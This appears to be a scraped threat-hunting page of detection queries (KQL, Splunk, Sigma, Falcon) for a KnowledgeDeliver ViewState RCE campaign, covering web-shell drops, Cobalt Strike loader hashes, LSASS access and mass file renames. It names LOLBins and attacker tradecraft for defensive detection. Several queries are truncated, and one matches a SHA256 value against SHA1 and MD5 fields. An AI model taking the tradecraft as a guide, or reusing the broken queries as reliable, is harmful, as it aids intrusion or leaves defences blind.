      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process

    from datamodel=Endpoint.Processes

    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT

| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",

| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5") or SHA1 in~ ("1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5") or MD5 in~ ("1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5") or SHA1 in~ ("1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5") or MD5 in~ ("1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["1b2555b09ac62164638f47c8272beb6b0f97186e37d3a54cb84c723ff7a2eee5"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).

Installation. Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] KnowledgeDeliver ViewState deserialization RCE: w3wp.exe spawns OS shells (CVE-2026-5426) Exploitation High
Hunts the post-exploitation moment of CVE-2026-5426 where a malicious signed ViewState payload achieves OS-level code execution and the IIS worker process (w3wp.exe) spawns command interpreters or recon binaries. This is the highest-fidelity signal of the KnowledgeDeliver zero-day chain and the Godzilla web shell command execution. Rationale: Pivots on the article's exact post-exploitation behaviour — ViewState deserialization yields OS-level RCE under the IIS worker w3wp.exe. The w3wp.exe parent + shell/recon child pair is called out explicitly as a strong signal by Mandiant/Google Cloud and Rescana write-ups of CVE-2026-5426. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability • https://www.rescana.com/post/active-exploitation-of-cve-2026-5426-in-knowledgedeliver-lms-enables-godzilla-bluebeam-web-shell-and-cobalt-strike-attac • https://asec.ahnlab.com/en/85088/
ATT&CKT1190 T1505.003 T1059.003
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "w3wp.exe"
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","whoami.exe","net.exe","net1.exe","nltest.exe","systeminfo.exe","ipconfig.exe","tasklist.exe","reg.exe","schtasks.exe","certutil.exe","bitsadmin.exe","rundll32.exe","cscript.exe","wscript.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, ParentPath = InitiatingProcessFolderPath, ParentCmd = InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where ParentProcessName endswith "\\w3wp.exe"
| where NewProcessName has_any ("\\cmd.exe","\\powershell.exe","\\pwsh.exe","\\whoami.exe","\\net.exe","\\net1.exe","\\nltest.exe","\\systeminfo.exe","\\ipconfig.exe","\\tasklist.exe","\\reg.exe","\\schtasks.exe","\\certutil.exe","\\bitsadmin.exe","\\rundll32.exe","\\cscript.exe","\\wscript.exe")
| where SubjectUserName !endswith "$"
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc
title: IIS Worker Process Spawning Command Interpreter (KnowledgeDeliver ViewState RCE)
id: 5f3c1a82-9d44-4e21-b1aa-2c9f0e7d4b10
description: Detects w3wp.exe spawning command shells or recon binaries, indicative of ViewState deserialization RCE (CVE-2026-5426) and Godzilla web shell command execution.
references:

detection:

    ParentImage|endswith: '\w3wp.exe'
    Image|endswith:

  condition: selection
level: high
source:windows.sysmon @EventID:1 @ParentImage:(*\\w3wp.exe OR *\\W3WP.EXE) @Image:(*\\cmd.exe OR *\\Cmd.exe OR *\\powershell.exe OR *\\PowerShell.exe OR *\\whoami.exe OR *\\net.exe OR *\\net1.exe OR *\\nltest.exe OR *\\certutil.exe OR *\\bitsadmin.exe OR *\\rundll32.exe OR *\\cscript.exe OR *\\wscript.exe OR *\\reg.exe OR *\\schtasks.exe)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/w3wp\.exe$/i
| ImageFileName=/\\(cmd|powershell|pwsh|whoami|net|net1|nltest|systeminfo|ipconfig|tasklist|reg|schtasks|certutil|bitsadmin|rundll32|cscript|wscript)\.exe$/i
| groupBy([aid, ComputerName, ImageFileName, CommandLine], function=count())

[LLM] ASP.NET ViewState MAC verification failures (Event ID 1316) on KnowledgeDeliver IIS hosts Exploitation Medium
Hunts the exploitation-attempt fingerprint of CVE-2026-5426: ASP.NET logging ViewState MAC validation failures (Application log Event ID 1316, source ASP.NET 4.0.30319.0, event code 4009). Repeated or first-seen failures on an internet-facing IIS host indicate an actor trialing crafted/signed ViewState payloads against the shared hardcoded machineKey. Rationale: Event ID 1316 / ASP.NET 4.0.30319.0 code 4009 ("Viewstate verification failed") is explicitly named by corroborating analyses of this campaign as the canonical exploit-attempt signal. Defender Advanced Hunting has no Application-channel table, so defender_kql is intentionally empty; Datadog/Falcon also do not list the Application channel, hence empty. Threshold (>=3) is empirical to cut benign single-event post-deploy noise. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability • https://www.rescana.com/post/active-exploitation-of-cve-2026-5426-in-knowledgedeliver-lms-enables-godzilla-bluebeam-web-shell-and-cobalt-strike-attac
ATT&CKT1190
Data sources
Event
| where TimeGenerated > ago(7d)
| where EventLog == "Application"
| where EventID == 1316
| where Source startswith "ASP.NET"
| where RenderedDescription has_any ("Viewstate","MAC validation","4009")
| summarize Failures = count(), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated), Sample = any(RenderedDescription) by Computer
| where Failures >= 3
| order by Failures desc
CLOUD
`wineventlog_application` (EventCode=1316 OR EventID=1316) (SourceName="ASP.NET 4.0.30319.0" OR source="ASP.NET*") (Message="*Viewstate*" OR Message="*MAC validation*" OR Message="*4009*")
| stats count min(_time) as firstTime max(_time) as lastTime values(Message) as sampleMessage by host
| where count >= 3
| convert ctime(firstTime) ctime(lastTime)
| sort - count
[LLM] IIS worker (w3wp.exe) writing .aspx/.js/.config — Godzilla web shell drop & malicious JS injection Installation Medium
Hunts the install/persistence step of the KnowledgeDeliver intrusion where the compromised IIS worker writes web-servable files: dropping the Godzilla (.NET) web shell as .aspx, or modifying an application JavaScript file to prompt users to install a fake 'security authentication plugin' and load an attacker-controlled script. Targets file-write telemetry attributed to w3wp.exe. Rationale: Directly models the article's two install actions — Godzilla deployed as a .NET web shell and an application JavaScript file modified to load an attacker script / fake plugin. Attribution of the write to w3wp.exe is the high-fidelity constraint; benign apps rarely have the worker process write .aspx/.js to web roots at runtime. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability • https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/
ATT&CKT1505.003 T1505.004 T1059.007

| where FileName endswith ".aspx" or FileName endswith ".asmx" or FileName endswith ".ashx" or FileName endswith ".js" or FileName endswith ".config"
| project Timestamp, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessCommandLine, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)

| where TargetFileExtension in~ ("aspx","asmx","ashx","js","config")
| project TimeGenerated, DvcHostname, EventType, TargetFileName, TargetFilePath, ActingProcessName, TargetFileSHA256
| order by TimeGenerated desc

[LLM] Cobalt Strike fake 'security authentication plugin' installer hash (KnowledgeDeliver campaign) Installation High
Alerts on the presence or execution of the org-specific Cobalt Strike loader delivered as a fake installer in the KnowledgeDeliver intrusion (SHA256 7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2). Victims were lured by injected JavaScript to download a fake 'security authentication plugin' that planted the beacon. Rationale: Exact SHA256 IOC for the campaign's Cobalt Strike loader (the fake 'security authentication plugin' installer) named in the article and the pre-extracted IOC list — a hard, low-FP indicator. Covered across both file-write (drop) and process (execution) telemetry; CloudWatch left empty as this is Windows endpoint telemetry. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability • https://www.rescana.com/post/active-exploitation-of-cve-2026-5426-in-knowledgedeliver-lms-enables-godzilla-bluebeam-web-shell-and-cobalt-strike-attac
ATT&CKT1105 T1071.001 T1204.002

union

| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileSHA256 =~ "7c1f99dca8e5a7897892f9d224a6495023a2cfd2671697d229d355978c415ed2"

| where Timestamp > ago(1d)

// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-5426")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-5426")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
